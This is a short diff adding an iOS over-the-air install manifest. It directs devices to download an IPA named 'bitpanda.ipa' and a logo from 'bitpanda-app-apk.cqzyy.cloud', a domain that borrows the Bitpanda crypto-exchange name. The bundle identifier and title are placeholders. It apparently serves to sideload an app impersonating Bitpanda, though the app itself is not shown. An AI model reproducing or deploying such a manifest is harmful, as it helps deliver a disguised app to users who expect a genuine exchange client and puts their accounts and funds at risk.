@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>items</key>
+  <array>
+    <dict>
+      <key>assets</key>
+      <array>
+        <dict>
+          <key>kind</key>
+          <string>bitpanda-app</string>
+          <key>url</key>
+          <string>https://bitpanda-app-apk.cqzyy.cloud/bitpanda.ipa</string>
+        </dict>
+        <dict>
+          <key>kind</key>
+          <string>bitpanda-image</string>
+          <key>needs-shine</key>
+          <true/>
+          <key>url</key>
+          <string>https://bitpanda-app-apk.cqzyy.cloud/logo.png</string>
+        </dict>
+      </array>
+      <key>metadata</key>
+      <dict>
+        <key>bundle-identifier</key>
+        <string>io.xxx.xxx</string>
+        <key>bundle-version</key>
+        <string>1.0</string>
+        <key>kind</key>
+        <string>software</string>
+        <key>subtitle</key>
+        <string>xxx</string>
+        <key>title</key>
+        <string>xxx</string>
+      </dict>
+    </dict>
+  </array>
+</dict>
+</plist>
